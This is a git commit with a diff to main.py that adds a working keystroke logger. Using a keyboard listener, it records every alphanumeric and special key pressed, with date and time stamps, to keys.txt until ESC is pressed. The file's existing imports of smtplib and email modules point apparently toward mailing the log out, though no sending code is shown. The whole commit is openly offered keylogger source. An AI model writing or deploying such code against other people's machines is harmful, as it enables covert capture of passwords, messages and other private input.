d0a784866898611b315dee6ca169faf0eb0f483f
Subhodeep Sarkar <subhodeep.sofficial@gmail.com>
2021-09-21 20:57:03 +0530

    Track all alphanumeric & special keys
    Listener will actively listen to all the key press and if ESC is hit the program will terminate.
    All the key strokes along with the date and time stamps will be stored in keys.txt file.

--- main.py
+++ main.py
@@ -4,3 +4,23 @@ import os
 import smtplib
 from email.message import EmailMessage
 import mimetypes
+
+def on_press(key):
+    try:
+        file.write(f"Alphanumeric key pressed: {key.char} at {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}\n")
+    except AttributeError:
+        file.write(f"Special key pressed: {str(key)[4:]} {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}\n")
+
+def on_release(key):
+    if key == keyboard.Key.esc:
+        return False
+try:
+    file = open('keys.txt','w')
+    with keyboard.Listener(
+        on_press=on_press,
+        on_release=on_release) as listener:
+        listener.join()
+except:
+    pass
+finally:
+    file.close()
